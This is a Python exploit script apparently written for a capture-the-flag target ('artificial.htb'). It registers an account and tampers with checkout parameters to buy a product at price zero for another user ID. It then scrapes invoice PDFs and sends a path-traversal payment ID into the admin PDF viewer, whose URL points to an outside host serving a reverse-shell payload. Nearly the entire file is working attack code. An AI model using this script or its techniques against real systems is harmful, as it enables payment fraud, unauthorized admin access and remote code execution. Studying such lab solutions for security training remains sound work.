#!/usr/bin/python3.11

import requests
from pdfminer.high_level import extract_text
import re
from bs4 import BeautifulSoup
import random
import string

def get_random_str(num_of_chars):
    return ''.join(random.choices(string.ascii_lowercase, k=num_of_chars))
    
class Invoice:
    def __init__(self, order_id, payment_id, date, user, product, price, completed):
        self.order_id = order_id
        self.payment_id = payment_id
        self.date = date
        self.user = user
        self.product = product
        self.price = price
        self.completed = completed

    def __repr__(self):
        return f"<Order Id: {self.order_id} - User: {self.user} - ID: {self.payment_id}>"

base = "http://artificial.htb:30672"  # Change port to the actual target port if remote
s = requests.Session()

def register(email, password):
    s.post(f"{base}/register", data={"email": email, "password": password})

def login(email, password):
    s.post(f"{base}/login", data={"email": email, "password": password})

def purchase(product_id):
    res = s.get(f"{base}/checkout?product_id={product_id}", allow_redirects=False)
    location = res.headers.get("Location")
    if "payment_id=" in location:
        payment_id = location.split("payment_id=")[-1]
        return payment_id
    return None

def purchase_with_price(title, price, user_id, email):
    res = s.get(f"{base}/checkout?title={title}&price={price}&user_id={user_id}&email={email}", allow_redirects=False)
    location = res.headers.get("Location")
    if "payment_id=" in location:
        payment_id = location.split("payment_id=")[-1]
        return payment_id
    return None

def extract_text_from_pdf(filepath):
    try:
        text = extract_text(filepath)
        print(f"[+] PDF Content:\n{text}")
        order_id = int(re.search(r"Order ID:\s+(\d+)", text).group(1))
        payment_id = re.search(r"Payment ID:\s+([a-f0-9-]+)", text).group(1)
        date = re.search(r"Date:\s+([^\n]+)", text).group(1)
        user = re.search(r"User:\s+([^\n]+)", text).group(1)
        product = re.search(r"Product:\s+([^\n]+)", text).group(1)
        price = float(re.search(r"Price:\s+\$(\d+\.?\d*)", text).group(1))
        completed = "Yes" in text
        return Invoice(order_id, payment_id, date, user, product, price, completed)
    except Exception as e:
        print(f"[-] Failed to parse PDF: {e}")
        return None

def get_subscriptions():
    print("[+] Grabbing subscriptions for User ID")
    res = s.get(f"{base}/subs", allow_redirects=False)
    html = res.content
    soup = BeautifulSoup(html, 'html.parser')

    tbody = soup.find('tbody')
    if not tbody:
        print("[-] No subscriptions found.")
        return None

    row = tbody.find('tr')
    if not row:
        print("[-] No order rows found.")
        return None

    cells = row.find_all('td')
    order_id = cells[0].text.strip()
    user_id = cells[1].text.strip()
    payment_id = cells[2].text.strip()
    email = cells[3].text.strip()
    product_title = cells[5].text.strip()

    print(f"[+] Found order: user_id={user_id}, payment_id={payment_id}, product_title={product_title}")

    return {
        "user_id": user_id,
        "order_id": order_id,
        "payment_id": payment_id,
        "email": email,
        "product_title": product_title
    }

def get_invoice(payment_id):
    url = f"{base}/static/invoices/invoice_{payment_id}.pdf"
    res = s.get(url)
    if res.status_code == 200:
        filepath = f"invoice_{payment_id}.pdf"
        with open(filepath, "wb") as f:
            f.write(res.content)
        print(f"[+] Invoice downloaded: {filepath}")
        return extract_text_from_pdf(filepath)
    else:
        print(f"[-] Failed to fetch invoice: {res.status_code}")
        return None


def checkout_success(order_id, payment_id):
    print(f"[+] Checking out... will activate bot")
    headers = {"Content-Type":"application/pdf"}
    res = s.get(f"{base}/checkout/success?order_id={order_id}&payment_id={payment_id}", headers=headers, allow_redirects=False)
    if res.status_code == 200:
        print(f"[+] Checkout successful: Your order was completed successfully, thank you.")
    else:
        print(f"[+] Checkout failed: {res.status_code}")
    

# === Flow ===
email = f"someuser_{get_random_str(5)}"
password = "pass123"

register(email, password)
login(email, password)

payment_id = purchase_with_price(title='xxd', price=0, user_id=2, email=email)
print(f"[+] Got payment_id: {payment_id}")

if payment_id:
    invoice = get_invoice(payment_id)
    if invoice:
        print(f"[+] Parsed Invoice: {invoice}")
        checkout_success(invoice.order_id, "/../../../../../../admin/view-pdf?url=http://minegoboom.xyz:9002/payload_revbin")